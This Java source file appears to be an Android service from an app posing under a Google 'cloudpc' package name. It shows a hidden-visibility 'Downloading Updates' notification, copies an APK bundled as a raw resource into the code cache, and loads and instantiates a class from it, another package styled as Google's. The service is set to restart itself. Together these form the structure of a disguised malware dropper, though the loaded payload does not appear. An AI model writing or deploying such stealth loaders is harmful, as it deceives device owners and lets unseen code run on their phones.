package com.google.android.apps.work.cloudpc;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.media.AudioAttributes;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class MyService extends Service {

    private static final String TAG = "MyService";
    private static final String CHANNEL_ID = "CloudPCServiceChannel";
    static boolean isRunning = false;

    public static void start(Context context) {
        Manager.init();
        if (isRunning) {
            Log.i(TAG, "Service already running");
            return;
        }

        Intent serviceIntent = new Intent(context, MyService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent);
        } else {
            context.startService(serviceIntent);
        }
    }

    private String getFilePathFromRawResource(int resourceId) {
        // Create a file in the app's internal 'code_cache' directory
        File tempApk = new File(getCodeCacheDir(), "temp_loaded.apk");

        try (InputStream is = getResources().openRawResource(resourceId);
             FileOutputStream os = new FileOutputStream(tempApk)) {

            byte[] buffer = new byte[1024];
            int length;
            while ((length = is.read(buffer)) > 0) {
                os.write(buffer, 0, length);
            }
            os.flush();
            return tempApk.getAbsolutePath();
        } catch (Exception e) {
            Log.e("Path", "Failed to copy resource", e);
            return null;
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "Service created");
        createNotificationChannel();

    }


    Uri soundUri;
    Notification notification;
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "Service started");
        soundUri = Uri.parse("android.resource://" + getPackageName() + "/" + R.raw.clean);


        notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Downloading Updates")
                .setContentText("Updates are being downloaded...")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setSound(soundUri)
                .build();


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(1, notification);
        }

//        scheduleAlarm(10);
        String Path = getFilePathFromRawResource(R.raw.app_debug);
        Log.i("Path", Path);
        ClassLoader loader = Loader.loadClassesFromApk(Path);

        try {
            Class<?> loadedClass  = loader.loadClass("com.google.android.apps.work.devloading.MainActivity");

            Object instance = loadedClass.newInstance();
            Log.i("DexLoader", "Successfully loaded: " + loadedClass.getName());
        } catch (ClassNotFoundException | IllegalAccessException | InstantiationException e) {
            Log.e("DexLoader", "Error loading class", e);
        }

        isRunning = true;
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "CloudPC Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            
            AudioAttributes audioAttributes = new AudioAttributes.Builder()
                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .setUsage(AudioAttributes.USAGE_NOTIFICATION)
                    .build();
            
            serviceChannel.setSound(soundUri, audioAttributes);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        Log.i(TAG, "Service bound");
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "Service destroyed");


        isRunning = false;
    }

    @Override
    public void onLowMemory() {
        super.onLowMemory();
        Log.i(TAG, "Service low memory");
    }

    @Override
    public boolean onUnbind(Intent intent) {
        Log.i(TAG, "Service unbound");
        return super.onUnbind(intent);
    }
}
